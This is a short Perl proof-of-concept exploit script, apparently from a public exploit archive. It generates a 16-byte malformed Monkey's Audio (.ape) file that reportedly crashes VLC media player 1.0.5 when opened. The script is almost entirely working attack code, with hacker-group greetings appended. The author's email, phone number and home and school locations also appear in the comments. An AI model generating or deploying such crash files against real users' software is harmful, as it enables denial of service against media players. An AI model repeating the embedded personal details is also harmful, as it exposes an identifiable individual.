#!/usr/bin/perl

###
# Title : VLC media player v1.0.5 (.ape) Local Crash PoC
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : VLC media player Just Crashed
# Tested on : Windows XP SP3 Fran�ais 
# Target : VLC media player v1.0.5
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : 1 - Creat APE file ( Monkey's Audio Format )
#      =>    2 - Open APE file With VLC 1.0.5
#      =>    3 -  Crashed !!!
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |===========================================================|\n";
print "    |= [!] Name : VLC media player v1.0.5 (Monkey's File)      =|\n";
print "    |= [!] Exploit : Local Crash PoC                           =|\n";
print "    |= [!] Author : KedAns-Dz                                  =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n";
print "    |===========================================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = "\x4D\x41\x43\x20\x96\x0f\x00\x00\x34\x00\x00\x00\x18\x00\x00\x00"; # APE Header
open(file , ">", "Kedans.ape"); # Evil File APE (16 bytes) 4.0 KB
print file $PoC;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);  

#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
# Special Greets to : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=> {{
# Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz * His0k4 * Dr.0rYX 
# Cr3w-DZ * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends . }} ,
# [ Special Greets to '3em GE Class' & all 3Se Pupils , BACALORIA 2011 Enchallah 
# Messas Secondary School - Ain mlilla - 04300 - Algeria ] ,
# Greets All My Friends (cit� 1850 logts - HassiMessaouD - 30008 -Algeria ) ,
# ThanX : (hotturks.org) TeX * KadaVra ... all Muslimised Turkish Hackers .
# ThanX to : Kelvin.Xgr (kelvinx.net) Vietnamese Hacker .
#===============================================================================